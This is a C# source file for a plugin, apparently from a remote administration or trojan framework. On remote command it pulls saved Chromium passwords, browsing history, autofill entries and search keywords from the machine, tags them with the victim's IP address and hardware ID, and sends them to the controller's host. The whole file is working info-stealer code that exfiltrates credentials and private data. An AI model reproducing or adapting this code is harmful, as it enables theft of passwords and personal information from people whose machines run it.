using PacketLib.Utils;
using PacketLib.Packet;
using PacketLib;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            ClientHandler clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key);
            clientHandler.ConnectStart();
       
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.RECOVERY_PASSWORDS:
                    PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, passwordsPacket);
                    break;

                case PacketType.RECOVERY_HISTORY:
                    HistoryPacket historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, historyPacket);
                    break;

                case PacketType.RECOVERY_AUTOFILL:
                    AutofillPacket autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key ,autofillPacket);
                    break;

                case PacketType.RECOVERY_KEYWORDS:
                    KeywordsPacket keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.baseIp,loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, keywordsPacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
